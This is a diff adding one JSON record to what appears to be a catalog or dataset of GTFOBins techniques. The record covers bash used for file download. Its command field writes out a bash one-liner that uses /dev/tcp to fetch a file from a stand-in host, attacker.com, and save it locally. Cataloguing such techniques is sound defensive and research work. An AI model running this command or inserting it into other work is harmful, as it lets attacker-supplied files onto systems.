@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-bash-download-1",
+  "name": "GTFOBins · bash (download) #1",
+  "command": "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'",
+  "description": "Use bash to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "bash",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/bash/#download",
+  "upstream_id": "bash/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/bash/"
+    }
+  ]
+}
